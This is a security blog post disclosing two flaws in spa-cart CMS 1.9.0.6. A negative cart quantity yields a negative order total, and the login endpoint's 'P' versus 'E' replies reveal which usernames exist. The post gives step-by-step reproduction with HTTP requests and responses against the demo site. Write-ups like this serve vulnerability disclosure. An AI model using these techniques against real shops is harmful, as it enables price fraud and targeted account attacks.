

# [MSecure](https://msecureltd.blogspot.com/)

## Monday, 22 April 2024

### Friday Fun Pentest Series - 5 - spa-cartcmsv1.9.0.6

**Description**

- It was found that the application suffers from business logic flaw

- Additionally the application is vulnerable to username enumeration on the login page

**Logic Flaw**

**Steps to Reproduce:**

1. Checkout page and intercept HTTP POST request
2. Add minus quantity such as -10
3. The final price would come up as negative value

// HTTP POST request modifying the quantity to negative value
POST /cart/add HTTP/2Host: demo.spa-cart.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 [...]
productid=225&**amount=-10**

// HTTP response
HTTP/2 200 OKServer: nginx[...]
[...]<img src="https://demo.spa-cart.com/var/photo/product/234x200/225/695/1.jpg" alt="" /><b>Five And Two Jewelry Piper Gold-Plated Earrings</b> added to cart<br /><br /><strong class="added\_price">**Price: <span><span class="currency">$</span>59.00</span>**</strong><div class="added\_options"><b>Selected options:</b>Qty: 1<br />Color: silver gold<br /></div>[...]

// HTTP GET request to checkout
**GET /checkout HTTP/2**Host: demo.spa-cart.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 [...]

// HTTP response showing negative amount owned
HTTP/2 200 OKServer: nginx[...]
[...]\t<td>silver gold<\/td>\r\n<\/tr>\r\n<\/table>\r\n <\/td>\r\n <td class=\"line\" nowrap align=\"right\">\r\n**<span class=\"currency\">$<\/span>59.00 x -10 = <span** **class=\"currency\">$<\/span>-590.00 <\/td>**\r\n<\/tr>\r\n<\/table>\r\n\r\n<br \/>\r\n<hr \/>\r\n<br \/>\r\n<div class=\"checkout-guest-mobile\">\r Subtotal: <span class=\"currency\">$<\/span>-590.00<br \/><br \/>\r\n**You cannot order below $10.00<\/div>**","Checkout",null,"checkout",null][...]

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKos55vwrn4g6uItDUXrYI5Fsj4dLsIVcVaL0UiRSlXhmC0KjlhTd8dLkryoSnAriDzBKEVz3O6T70A5GwlQa8zL_Yx_kkAq4_o6chDlDnjOi1IFFzfRmUlWtwgkF0OgEmwykumd3XFfcSB9Hd5ssFAESixWahOkLKQ6jJplSSuIVrLcg_cX5204Kqh2s/w400-h217/SPACMS-Business-Logic-Flaw.PNG)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKos55vwrn4g6uItDUXrYI5Fsj4dLsIVcVaL0UiRSlXhmC0KjlhTd8dLkryoSnAriDzBKEVz3O6T70A5GwlQa8zL_Yx_kkAq4_o6chDlDnjOi1IFFzfRmUlWtwgkF0OgEmwykumd3XFfcSB9Hd5ssFAESixWahOkLKQ6jJplSSuIVrLcg_cX5204Kqh2s/s634/SPACMS-Business-Logic-Flaw.PNG)

**Username Enumeration****Steps to Reproduce:**

1. Register account
2. Enter valid account with wrong password
3. Trap HTTP request
4. Check that response for valid username has "P" message
5. Enter invalid account with wrong password
6. Check that response for invalid username has "E" message

// HTTP POST request with valid username and wrong password
POST /login HTTP/2Host: demo.spa-cart.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36[...]
**email=test%40test.test**&password=test123

// HTTP response showing "P" error message
**HTTP/2 200 OK**Server: nginx[...]
**P**

// HTTP POST request with invalid username and wrong password
POST /login HTTP/2Host: demo.spa-cart.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36[...]
**email=test%40test.t3st**&password=test123

// HTTP response showing "E" error message
**HTTP/2 200 OK**Server: nginx[...]
**E**

at

[April 22, 2024](https://msecureltd.blogspot.com/2024/04/friday-fun-pentest-series-5-spa.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=5263994941392608735&postID=8519735015672563992&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=5263994941392608735&postID=8519735015672563992&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=5263994941392608735&postID=8519735015672563992&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=5263994941392608735&postID=8519735015672563992&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=5263994941392608735&postID=8519735015672563992&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=5263994941392608735&postID=8519735015672563992&target=pinterest "Share to Pinterest")

#### No comments:

#### Post a Comment

[Newer Post](https://msecureltd.blogspot.com/2024/05/friday-fun-pentest-series-6.html "Newer Post")

[Older Post](https://msecureltd.blogspot.com/2024/04/web-labs-finished.html "Older Post")

[Home](https://msecureltd.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](https://msecureltd.blogspot.com/feeds/8519735015672563992/comments/default)

### [Friday Fun Pentest Series - 16 - Stored XSS with Filter Bypass - blogenginev3.3.8](https://msecureltd.blogspot.com/2024/12/friday-fun-pentest-series-16-stored-xss.html)

Description - It was found that the application was vulnerable to Stored XSS via specific payload that bypassed the filtering in place. Stor...

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXgnYM-tJQdAgmE_F0YhOH5Z-1ICR5XNP1hF2bPfDIky-x_sCFNQQwfrZ5oRxnJ_txdpWkYguUK3nKDgxlDFmV6AFe7nGH42rx71Lt2ofQcQPxdJO0lBLYmldRofJRX3ZjfOYvOn8XdVIcRezjORRK6ph0W4oREgx-Fot78S0cg7JIoFtuMDqaVB8t8Sk/w400-h278/BlogEngine-Stored%20XSS-Add%20Category-Add%20Payload.jpg)

* [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKos55vwrn4g6uItDUXrYI5Fsj4dLsIVcVaL0UiRSlXhmC0KjlhTd8dLkryoSnAriDzBKEVz3O6T70A5GwlQa8zL_Yx_kkAq4_o6chDlDnjOi1IFFzfRmUlWtwgkF0OgEmwykumd3XFfcSB9Hd5ssFAESixWahOkLKQ6jJplSSuIVrLcg_cX5204Kqh2s/w72-h72-p-k-no-nu/SPACMS-Business-Logic-Flaw.PNG)](https://msecureltd.blogspot.com/2024/04/friday-fun-pentest-series-5-spa.html)

  [Friday Fun Pentest Series - 5 - spa-cartcmsv1.9.0.6](https://msecureltd.blogspot.com/2024/04/friday-fun-pentest-series-5-spa.html)
  Description - It was found that the application suffers from business logic flaw - Additionally the application is vulnerable to username en...
* [Friday Fun Pentest Series - 6 - fengofficev3.11.1.2](https://msecureltd.blogspot.com/2024/05/friday-fun-pentest-series-6.html)
    Description - It was found that the application suffers from Blind SQL injection Blind SQL Injection Steps to Reproduce: Login to applicat...
* [![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2N1bYN-gX08dZTgsPMvc5iL5qn4v6D-7VjjutA7umPk5MG2pvKI5pgUZwFsU98AeuIdqmbebs-5TEnh3v-ahtTyw7rHORLr-_Ro4Rca1D3ZxQo7K7YrPhozEP-006QCx-pJgOQmfhKm-y-oCd__nbSV_arnnaLwQUJudgJdQmG1JrQPgVgjmHPh7skzk/w72-h72-p-k-no-nu/SMF-IDOR.PNG)](https://msecureltd.blogspot.com/2024/06/friday-fun-pentest-series-7-smfv214.html)

  [Friday Fun Pentest Series - 7 - smfv2.1.4](https://msecureltd.blogspot.com/2024/06/friday-fun-pentest-series-7-smfv214.html)
  Description - It was found that the application is suffering from code injection vulnerability - The flaw allows the attacker to inject PHP ...

## About Me

[mwebsec](https://www.blogger.com/profile/03498135932389991097)

[View my complete profile](https://www.blogger.com/profile/03498135932389991097)

## Search This Blog

|  |  |
| --- | --- |

* [Home](https://msecureltd.blogspot.com/)

| [Report Abuse](https://www.blogger.com/go/report-abuse) |  |
| --- | --- |

## Blog Archive

* [December 2024](https://msecureltd.blogspot.com/2024/12/) (1)
* [November 2024](https://msecureltd.blogspot.com/2024/11/) (3)
* [October 2024](https://msecureltd.blogspot.com/2024/10/) (3)
* [September 2024](https://msecureltd.blogspot.com/2024/09/) (2)
* [August 2024](https://msecureltd.blogspot.com/2024/08/) (1)
* [July 2024](https://msecureltd.blogspot.com/2024/07/) (1)
* [June 2024](https://msecureltd.blogspot.com/2024/06/) (2)
* [May 2024](https://msecureltd.blogspot.com/2024/05/) (1)
* [April 2024](https://msecureltd.blogspot.com/2024/04/) (3)
* [March 2024](https://msecureltd.blogspot.com/2024/03/) (4)
* [February 2024](https://msecureltd.blogspot.com/2024/02/) (4)
* [July 2023](https://msecureltd.blogspot.com/2023/07/) (6)
* [March 2023](https://msecureltd.blogspot.com/2023/03/) (7)

|  |  |
| --- | --- |

Simple theme. Powered by [Blogger](https://www.blogger.com).

